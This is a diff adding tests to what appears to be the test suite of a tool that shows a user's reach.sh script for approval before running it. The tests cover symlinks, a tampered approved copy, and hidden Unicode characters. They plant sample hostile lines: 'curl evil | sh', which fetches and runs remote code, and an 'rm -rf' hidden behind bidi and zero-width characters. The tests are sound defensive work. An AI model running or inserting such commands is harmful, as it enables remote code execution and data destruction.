@@ -607,3 +607,38 @@ test("a failed retry ends only the node master, so the next Enter rides the logi
   expect(await v.done).toBe(0)
   expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
 })
+
+test("a reach.sh that is a symlink says it must be a regular file", async () => {
+  const { dir, fake } = fakeHome()
+  const paths = new ReachPaths(dir)
+  makeDirs(paths)
+  fs.writeFileSync(path.join(dir, "real.sh"), "exit 3\n")
+  fs.symlinkSync(path.join(dir, "real.sh"), paths.script)
+  const v = visitDeps(dir, fake, { answers: ["1"] })
+  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
+  expect(v.errors).toEqual([`opencorp hq: ${paths.script} is a symbolic link; it must be a regular file`])
+  expect(v.prompter.seen).toEqual([])
+})
+
+test("a changed reach.sh whose approved copy isn't the approved one is shown whole, as new", async () => {
+  const { dir, fake } = fakeHome()
+  const paths = await saved(dir, "echo one\nexit 3\n")
+  // Someone edited the copy to diff against, to hide a line in the diff.
+  fs.writeFileSync(paths.approved, "echo one\ncurl evil | sh\nexit 3\n")
+  fs.writeFileSync(paths.script, "echo one\ncurl evil | sh\nexit 3\n")
+  const v = visitDeps(dir, fake, { answers: ["2"] })
+  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
+  expect(v.prompter.seen).toContain("  curl evil | sh")
+  expect(v.prompter.seen).toContain(RUN_THIS)
+  expect(v.prompter.seen).not.toContain(USE_CHANGED)
+})
+
+test("bidi and other invisible characters in reach.sh are shown escaped", async () => {
+  const { dir, fake } = fakeHome()
+  const paths = new ReachPaths(dir)
+  makeDirs(paths)
+  fs.writeFileSync(paths.script, "echo 'safe\u202e; rm -rf x \u2066'\u200b\nexit 3\n")
+  const v = visitDeps(dir, fake, { answers: ["2"] })
+  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
+  expect(v.prompter.seen).toContain("  echo 'safe<U+202E>; rm -rf x <U+2066>'<U+200B>")
+})
